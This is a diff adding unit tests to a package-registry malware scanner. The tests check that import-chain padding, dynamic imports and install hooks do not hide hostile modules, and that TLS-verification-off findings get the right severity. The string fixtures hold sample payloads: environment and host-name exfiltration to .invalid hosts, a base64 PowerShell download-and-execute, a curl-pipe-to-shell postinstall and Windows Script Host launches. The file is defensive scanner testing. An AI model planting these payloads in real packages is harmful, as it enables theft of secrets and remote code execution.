@@ -5,15 +5,33 @@ a reverse shell, host information sent out and a download that is run; and
 the modules a package's top-level modules import (wheel or sdist) get the
 import-time test, CRITICAL for the shapes no library needs.
 
+BR-5 (0.1.9): both walks go to the end. They stopped at 300 modules seen (the
+import-time walk) and 200 (setup.py's), so a module imported past them, by
+padding, got no test; and each module of an import list, a statement after a
+`;` or a compound statement's `:`, a continued line, a commented name list and
+a module named by a literal to import_module(), __import__() or run_module()
+are followed. The deadline is checked as each module is read.
+
 Payloads are inert: hosts are .invalid, nothing is extracted or executed.
 """
 import base64
+import json
+import time
 import unittest
+from unittest import mock
 
-from tests.registry._review_support import issues, scan_sdist, scan_wheel
+from lazaret.registry import repo
+from tests.registry._review_support import (hooks as hook_manifest, issues, manifest, scan_npm, scan_sdist, scan_wheel,
+                                            zipball)
 
 WHEEL_META = {"x-1.0.dist-info/METADATA": "Name: x\nVersion: 1.0\n"}
 SETUP = "from setuptools import setup\nsetup(name='x')\n"
+# the whole environment sent away: CRITICAL at import time
+EVIL_PY = ("import os, json, urllib.request\nurllib.request.urlopen('https://collector.invalid/c', "
+           "data=json.dumps(dict(os.environ)).encode())\n")
+# the host name sent away: CRITICAL in code pip runs to install an sdist
+BEACON_PY = ("import socket, requests\n"
+             "requests.post('https://x.invalid/b', json={'h': socket.gethostname()})\n")
 PS_RUN = base64.b64encode('Invoke-WebRequest -Uri "https://x.invalid/a.exe" -OutFile "a.exe"; '
                           'Invoke-Expression "a.exe"'.encode("utf-16-le")).decode()
 
@@ -94,6 +112,270 @@ class ImportReachTests(unittest.TestCase):
                           "tests/test_x.py": ("import socket, requests\n"
                                               "requests.post('https://webhook.site/1', json={'h': socket.gethostname()})\n")})
         self.assertEqual(imports(res), [("x/telemetry.py", "CRITICAL")])
+
+    def test_padding_hides_no_module(self):
+        # x/__init__.py imports n modules, the last of which imports evil.py: past 299, evil.py lost its CRITICAL
+        # finding (the walk stopped at 300 modules seen, before reading any of them; and a name list was read to
+        # 50 names or 2,000 characters, an import list to its first module)
+        for n in (5, 320):
+            pads = {f"x/pad{i}.py": f"P{i} = {i}\n" for i in range(n - 1)}
+            pads[f"x/pad{n - 1}.py"] = "from . import evil\n"
+            names = [f"pad{i}" for i in range(n)]
+            for form, init in (("lines", "".join(f"from . import {name}\n" for name in names)),
+                               ("one name list", "from . import (" + ",\n    ".join(names) + ")\n"),
+                               ("one import list", "import " + ", ".join(f"x.{name}" for name in names) + "\n")):
+                with self.subTest(n=n, form=form):
+                    res = scan_wheel({**WHEEL_META, "x/__init__.py": init, **pads, "x/evil.py": EVIL_PY})
+                    self.assertEqual(imports(res), [("x/evil.py", "CRITICAL")])
+                    self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+
+    def test_a_deep_chain(self):
+        chain = {f"x/m{i}.py": f"from . import m{i + 1}\n" for i in range(400)}
+        chain["x/m400.py"] = "from .m0 import *\nfrom . import evil\n"              # (and back: each module once)
+        res = scan_wheel({**WHEEL_META, "x/__init__.py": "from . import m0\n", **chain, "x/evil.py": EVIL_PY})
+        self.assertEqual(imports(res), [("x/evil.py", "CRITICAL")])
+
+    def test_the_forms_of_an_import_statement(self):
+        for label, init in (
+                ("an import list", "import os, x.evil\n"),
+                ("after a semicolon", "import os; import x.evil\n"),
+                ("in a compound statement", "try: import x.evil\nexcept ImportError: pass\n"),
+                ("a continued line", "import os, \\\n    x.evil\n"),
+                ("a commented name list", "from . import (  # the parts\n    other,  # (this one)\n    evil,\n)\n"),
+                ("a name list with no space", "from x import(evil)\n"),
+                ("dots against import", "from .import evil\n"),
+                ("a package's submodule", "from .sub.inner import f\n")):
+            with self.subTest(label):
+                evil = "x/sub/__init__.py" if label == "a package's submodule" else "x/evil.py"
+                res = scan_wheel({**WHEEL_META, "x/__init__.py": init, "x/other.py": "",
+                                  "x/sub/inner.py": "def f():\n    pass\n", evil: EVIL_PY})
+                self.assertEqual(imports(res), [(evil, "CRITICAL")])
+
+    def test_a_module_named_to_import_module_import_or_run_module(self):
+        for label, text in (
+                ("import_module", "import importlib\nimportlib.import_module('x.evil')\n"),
+                ("imported from importlib", 'from importlib import import_module\nimport_module(r"x.evil")\n'),
+                ("against __package__", "import importlib\nimportlib.import_module('.evil', __package__)\n"),
+                ("against __name__", "import importlib\nimportlib.import_module(\n    '.evil', package=__name__)\n"),
+                ("against a literal", "import importlib\nimportlib.import_module('..evil', 'x.sub')\n"),
+                ("__import__", "__import__('x.evil')\n"),
+                ("run_module", "import runpy\nrunpy.run_module('x.evil')\n")):
+            with self.subTest(label):
+                res = scan_wheel({**WHEEL_META, "x/__init__.py": text, "x/evil.py": EVIL_PY})
+                self.assertEqual(imports(res), [("x/evil.py", "CRITICAL")])
+        # in a module that is not a package, __name__ names the module: '.evil' is x.a.evil, '..evil' x.evil
+        for rel, want in ((".evil", []), ("..evil", [("x/evil.py", "CRITICAL")])):
+            with self.subTest(name=rel):
+                res = scan_wheel({**WHEEL_META, "x/__init__.py": "from . import a\n", "x/evil.py": EVIL_PY,
+                                  "x/a.py": f"import importlib\nimportlib.import_module('{rel}', __name__)\n"})
+                self.assertEqual(imports(res), want)
+        # not followed: a name built as the code runs; a relative name with no package (import_module raises)
+        for text in ("import importlib\nimportlib.import_module(f'x.{NAME}')\n",
+                     "import importlib\nimportlib.import_module('.evil')\n", "__import__('.evil')\n"):
+            with self.subTest(text=text):
+                res = scan_wheel({**WHEEL_META, "x/__init__.py": text, "x/evil.py": EVIL_PY})
+                self.assertEqual(imports(res), [])
+
+    def test_the_walk_stops_at_the_deadline(self):
+        chain = {f"x/m{i}.py": f"from . import m{i + 1}\n" for i in range(400)}
+        real = repo._ArtifactScan._deadline
+
+        def deadline(scan, where):
+            if where == "x/m200.py" and not scan.first_pass:        # the time runs out as the walk reaches m200
+                scan.budget = repo.Budget(deadline=0.0)
+            return real(scan, where)
+        data = zipball({**WHEEL_META, "x/__init__.py": "from . import m0\n", **chain})
+        with mock.patch.object(repo._ArtifactScan, "_deadline", deadline):
+            res = repo._scan_artifact(data, "zip", "wheel", False, repo.Budget(deadline=time.monotonic() + 60))
+        self.assertEqual((res["verdict"], res["incomplete"]), ("INCOMPLETE", ["time"]))
+        self.assertIn("x/m200.py", " ".join(i["msg"] for i in issues(res, "SC-TRUNCATED")))
+
+
+class ImportReaderTests(unittest.TestCase):
+    """repo._py_import_targets: what a module names to import, as (dotted name, base) pairs."""
+
+    def targets(self, text, rel="x/__init__.py"):
+        return repo._py_import_targets(rel, text)
+
+    def test_a_name_lists_comments_end_nothing(self):
+        # a `)` in a comment closes nothing; a statement in a comment is not read, nor does it end the list
+        text = "from . import (a,  # (see below)\n    b,  # note: import c\n    d)\nimport e\n"
+        self.assertEqual(self.targets(text), [("a", "x"), ("b", "x"), ("d", "x"), ("e", None)])
+
+    def test_a_list_that_is_not_closed_ends_where_no_list_goes_on(self):
+        # (in a docstring): the statement after it is read
+        text = '"""\nfrom y import (a,\n"""\nimport evil\n'
+        self.assertEqual(self.targets(text), [("y", None), ("y.a", None), ("evil", None)])
+
+    def test_linear_time_on_hostile_texts(self):
+        for label, text in (("lists not closed", "from x import (\n" * 100_000),
+                            ("statements in a list's comments",
+                             "from x import (\n" + "    a,  # :from y import (\n" * 100_000 + ")\n"),
+                            ("a long name list", "from . import (" + "a, " * 200_000 + ")\n"),
+                            ("semicolons", ";import a" * 200_000), ("colons", ":" * 1_000_000),
+                            ("literals not closed", "import_module('aaaa" * 200_000),
+                            ("a list of comments", "from x import (\n" + "# )\n" * 200_000 + "evil)\n")):
+            with self.subTest(label):
+                start = time.monotonic()
+                self.targets(text)
+                self.assertLess(time.monotonic() - start, 10)
+
+
+class InstallReachTests(unittest.TestCase):
+    """setup.py's imports: the modules it runs as pip installs the sdist get the install-script test."""
+
+    def test_padding_hides_no_module(self):
+        # setup.py imports 250 modules, the first of which imports hook.py: past 199, hook.py was not an install
+        # script (helpers/ has no __init__.py: nothing imports it once installed)
+        pads = {f"helpers/pad{i}.py": "" for i in range(1, 250)}
+        pads["helpers/pad0.py"] = "from . import hook\n"
+        setup = "".join(f"import helpers.pad{i}\n" for i in range(250)) + SETUP
+        res = scan_sdist({"setup.py": setup, **pads, "helpers/hook.py": BEACON_PY})
+        self.assertEqual(hooks(res), [("helpers/hook.py", "CRITICAL", "helpers/hook.py runs when pip builds or "
+                                       "installs this sdist, and it sends the machine's user or host name over "
+                                       "the network.")])
+
+    def test_import_lists_and_named_modules(self):
+        for label, setup in (("an import list", "import os, helpers.hook\n"),
+                             ("a package's submodule", "from helpers import hook\n"),
+                             ("import_module", "import importlib\nimportlib.import_module('helpers.hook')\n"),
+                             ("in src/", "import sys\nsys.path.insert(0, 'src')\nimport os; import helpers.hook\n")):
+            with self.subTest(label):
+                where = "src/helpers/hook.py" if label == "in src/" else "helpers/hook.py"
+                res = scan_sdist({"setup.py": setup + SETUP, where: BEACON_PY})
+                self.assertEqual([(f, sev) for f, sev, _msg in hooks(res)], [(where, "CRITICAL")])
+
+    def test_an_in_tree_backends_imports(self):
+        # pip puts the backend-path directories on sys.path: an absolute import there is a module of the sdist
+        pyproject = '[build-system]\nrequires = []\nbuild-backend = "backend"\nbackend-path = ["_build"]\n'
+        res = scan_sdist({"pyproject.toml": pyproject, "_build/backend.py": "import helper\n",
+                          "_build/helper.py": BEACON_PY})
+        self.assertEqual([(f, sev) for f, sev, _msg in hooks(res)], [("_build/helper.py", "CRITICAL")])
+
+
+class CertificateChecksSeverityTests(unittest.TestCase):
+    """RA-12: a package whose only install/build-time reason is TLS certificate verification turned off is a
+    *weaker* indicator — the SC-INSTALL-HOOK finding is MAJOR and the verdict WARN, not SUSPICIOUS; with a strong
+    reason beside it, it is CRITICAL again. Inert text: hosts are .invalid, nothing runs."""
+
+    def test_npm_hook_cert_off_only_is_major_warn(self):
+        # a postinstall that runs a file which only turns off TLS certificate verification
+        res = scan_npm({"package.json": hook_manifest(postinstall="node setup.js"),
+                        "setup.js": "const https = require('https');\n"
+                                    "https.get({ host: 'x.invalid', rejectUnauthorized: false });\n"})
+        hook = issues(res, "SC-INSTALL-HOOK")
+        self.assertEqual([i["sev"] for i in hook], ["MAJOR"])
+        self.assertIn("turns off TLS certificate verification", hook[0]["msg"])
+        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
+
+    def test_npm_hook_cert_off_with_strong_reason_is_critical(self):
+        # cert-off beside a strong reason (a download piped into a shell) is CRITICAL again
+        res = scan_npm({"package.json": hook_manifest(postinstall="node setup.js"),
+                        "setup.js": "const cp = require('child_process');\n"
+                                    "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';\n"
+                                    "cp.execSync('curl -s https://x.invalid/s | sh');\n"})
+        self.assertEqual([i["sev"] for i in issues(res, "SC-INSTALL-HOOK")], ["CRITICAL"])
+        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+
+    def test_sdist_setup_cert_off_only_is_major_warn(self):
+        res = scan_sdist({"setup.py": "from setuptools import setup\nimport ssl\n"
+                                      "ssl._create_unverified_context()\nsetup(name='x')\n"})
+        hook = issues(res, "SC-INSTALL-HOOK")
+        self.assertEqual([i["sev"] for i in hook], ["MAJOR"])
+        self.assertIn("turns off TLS certificate verification", hook[0]["msg"])
+        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
+
+
+CERT_OFF = "turns off TLS certificate verification"
+WSH = "runs a script with the Windows Script Host"
+DL = "downloads.example.com"
+SENDS_ENV = ("const https = require('https');\n"
+             "https.request({ host: 'collect.example.com', method: 'POST' }).end(JSON.stringify(process.env));\n")
+
+
+class WeakReasonReviewTests(unittest.TestCase):
+    """The review of RA-12 / RA-11 (0298bd6), per finding: cert-off alone is MAJOR with its reason named, cert-off
+    beside a strong reason CRITICAL, and a weaker reason in a hook's command does not stop the follow of the files
+    it runs; the Windows Script Host launcher is matched where it runs (an exec call's program in code, a command's
+    in a batch file read as one), prose is not. Inert text: hosts are example.com or 192.0.2.x, nothing runs."""
+
+    def sev_msg(self, res, rule="SC-INSTALL-HOOK"):
+        return [(i["sev"], i["msg"]) for i in issues(res, rule)]
+
+    def test_a_weak_command_still_follows_the_file_it_runs(self):
+        res = scan_npm({"package.json": hook_manifest(postinstall=f"curl -k https://{DL}/x -o y && node evil.js"),
+                        "evil.js": SENDS_ENV})
+        [(sev, msg)] = self.sev_msg(res)
+        self.assertEqual(sev, "CRITICAL")
+        self.assertTrue(msg.startswith("Install hook runs evil.js, which sends environment variables"), msg)
+
+    def test_a_shell_script_and_a_batch_file_in_their_own_language(self):
+        # the #!/bin/sh script's `https://…` is not a JavaScript comment: its cert-off reason is named, MAJOR
+        res = scan_npm({"package.json": hook_manifest(postinstall="./install"),
+                        "install": f"#!/bin/sh\ncurl -fsSL https://{DL}/x -k -o bin/x\nchmod +x bin/x\n"})
+        self.assertEqual(self.sev_msg(res), [("MAJOR", f"Install hook runs ./install, which {CERT_OFF}.")])
+        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
+        # a batch file's `//nologo` is not either: its launch is CRITICAL; its REM and :: lines are not read
+        res = scan_npm({"package.json": hook_manifest(postinstall="./install.cmd"),
+                        "install.cmd": "@echo off\r\nREM curl -k is not used\r\ncscript //nologo setup.vbs\r\n"})
+        self.assertEqual(self.sev_msg(res), [("CRITICAL", f"Install hook runs ./install.cmd, which {WSH} (cscript //nologo setup.vbs).")])
+        res = scan_npm({"package.json": hook_manifest(postinstall="./install.cmd"),
+                        "install.cmd": f"@echo off\r\nREM curl -k https://{DL}/x\r\n:: wget --no-check-certificate\r\necho ok\r\n"})
+        self.assertEqual([sev for sev, _m in self.sev_msg(res)], ["MAJOR"])
+        self.assertNotIn(CERT_OFF, self.sev_msg(res)[0][1])
+
+    def test_wsh_launches_where_they_run(self):
+        res = scan_npm({"package.json": hook_manifest(postinstall="node install.js"),
+                        "install.js": "const cp = require('child_process'), path = require('path');\n"
+                                      "if (process.platform === 'win32') cp.exec('cscript ' + path.join(__dirname, 'x.vbs'));\n"})
+        self.assertEqual(self.sev_msg(res),
+                         [("CRITICAL", f"Install hook runs install.js, which {WSH} (cscript + path.join(__dirname, 'x.vbs')).")])
+        res = scan_npm({"package.json": hook_manifest(postinstall="node install.js"),
+                        "install.js": "console.log('On Windows, run cscript setup.vbs to finish');\n"})
+        self.assertEqual([sev for sev, _m in self.sev_msg(res)], ["MAJOR"])
+        self.assertNotIn(WSH, self.sev_msg(res)[0][1])
+        res = scan_sdist({"setup.py": "import os, subprocess\nif os.name == 'nt':\n    subprocess.run(['wscript', helper])\n"
+                                      "from setuptools import setup\nsetup(name='x')\n"})
+        self.assertEqual([sev for sev, _m in self.sev_msg(res)], ["CRITICAL"])
+        self.assertIn(f"{WSH} (wscript helper)", self.sev_msg(res)[0][1])
+
+    def test_gyp_action(self):
+        action = lambda argv: {"package.json": manifest().encode(), "binding.gyp": json.dumps(
+            {"targets": [{"target_name": "x", "actions": [{"action_name": "a", "inputs": [], "outputs": ["o"],
+                                                            "action": argv}]}]}).encode()}
+        res = scan_npm(action(["curl", "-k", f"https://{DL}/x", "-o", "o"]))
+        self.assertIn(("MAJOR", f'"binding.gyp action" script {CERT_OFF}.'), self.sev_msg(res))
+        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
+        res = scan_npm(action(["sh", "-c", f"curl -k https://{DL}/x.vbs -o x.vbs && cscript //nologo x.vbs"]))
+        self.assertIn(("CRITICAL", f'"binding.gyp action" script {WSH} (cscript //nologo x.vbs); and {CERT_OFF}.'),
+                      self.sev_msg(res))
+
+    def test_start_up_module(self):
+        meta = {"x-1.0.dist-info/METADATA": "Metadata-Version: 2.1\nName: x\nVersion: 1.0\n",
+                "x-1.0.dist-info/RECORD": ""}
+        res = scan_wheel(dict(meta, **{"sitecustomize.py": f"import requests\nrequests.get('https://{DL}/x', verify=False)\n"}))
+        [(sev, msg)] = self.sev_msg(res, "SC-SITECUSTOMIZE")
+        self.assertEqual(sev, "MAJOR")
+        self.assertTrue(msg.endswith(f"and it {CERT_OFF}."), msg)
+        res = scan_wheel(dict(meta, **{"sitecustomize.py": "import ssl, subprocess\n"
+                                                           "ssl._create_default_https_context = ssl._create_unverified_context\n"
+                                                           "subprocess.run(['wscript', 'x.vbs'])\n"}))
+        self.assertEqual([sev for sev, _m in self.sev_msg(res, "SC-SITECUSTOMIZE")], ["CRITICAL"])
+
+    def test_build_script(self):
+        from tests.registry.test_lookalike import scan_crate
+        cargo = '[package]\nname = "x"\nversion = "1.0.0"\nbuild = "build.rs"\n'
+        client = (f'let c = reqwest::blocking::Client::builder().danger_accept_invalid_certs(true).build().unwrap(); '
+                  f'let _ = c.get("https://{DL}/p").send();')
+        res = scan_crate({"Cargo.toml": cargo, "src/lib.rs": "pub fn f() {}\n", "build.rs": f"fn main() {{ {client} }}\n"})
+        [(sev, msg)] = self.sev_msg(res)
+        self.assertEqual(sev, "MAJOR")
+        self.assertTrue(msg.endswith(f"and it {CERT_OFF}."), msg)
+        res = scan_crate({"Cargo.toml": cargo, "src/lib.rs": "pub fn f() {}\n",
+                          "build.rs": f'fn main() {{ {client} std::process::Command::new("cscript").arg("x.vbs").status().unwrap(); }}\n'})
+        [(sev, msg)] = self.sev_msg(res)
+        self.assertEqual(sev, "CRITICAL")
+        self.assertIn(f"{WSH} (cscript x.vbs)", msg)
 
 
 if __name__ == "__main__":
